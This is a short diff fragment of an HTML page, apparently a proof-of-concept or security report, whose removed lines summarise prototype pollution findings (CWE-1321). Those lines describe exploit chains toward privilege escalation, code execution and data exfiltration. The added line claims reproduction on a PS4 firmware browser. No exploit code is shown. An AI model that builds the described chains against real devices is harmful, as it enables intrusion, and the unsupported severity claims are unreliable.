-  info('3. [HIGH→CRITICAL] Prototype Pollution via constructor.prototype');
-  info('   CWE-1321 | CVSS 9.1 | PoC: 1 linha | 100% reproduzível');
-  info('   → privilege escalation (isAdmin, role, authenticated)');
-  info('   → code execution via toJSON/toString/then injection');
-  info('   → data interception via push/call replacement');
-  info('');
-  info('4. [HIGH] Prototype Pollution via deepMerge __proto__');
-  info('   CWE-1321 | CVSS 8.8 | PoC: 5 linhas | 100% reproduzível');
-  info('');
-  info('Cadeia de exploração: 1+3 = data exfil com privilege escalation');
-  info('Cadeia de exploração: 2+3 = type confusion + prototype pivot');
+  info('REPRODUCTION: 100% on PS4 FW 13.04 built-in browser.');
 }
 </script>
 </body>
 </html>
-
